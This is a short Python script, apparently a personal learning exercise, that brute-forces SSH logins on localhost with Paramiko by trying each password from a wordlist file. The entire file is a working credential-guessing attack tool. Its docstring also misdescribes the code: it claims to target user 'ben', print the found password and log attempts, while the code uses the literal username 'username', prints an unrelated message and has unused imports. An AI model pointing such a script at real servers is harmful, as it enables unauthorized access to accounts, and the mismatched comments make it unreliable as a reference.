"""
SSH brute-force attack script using Paramiko.
Attempts to connect to localhost with username 'ben' using passwords from perm.txt.
Stops on first successful login and prints the working password.
Logs failed attempts and errors.
"""

from datetime import datetime
from time import time
import paramiko

with open ("/home/ben/git/cyber/bruteforce/perm.txt", 'r') as file:
    content = file.read().splitlines()
cur_time = datetime.now()
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for guess in content:
    try:
        ssh.connect(
            'localhost',
            username='username',
            password=guess,
            timeout=5,
            allow_agent=False,  # Prevents Paramiko from using SSH keys
            look_for_keys=False  # Ensures it does NOT look for ~/.ssh/id_rsa
        )
        print(f"Success!!! Terminate ALEXANDRA")
        break
    except paramiko.AuthenticationException:
        print(f"Failed: {guess}")
    except Exception as e:
        print(f"Error: {e}")

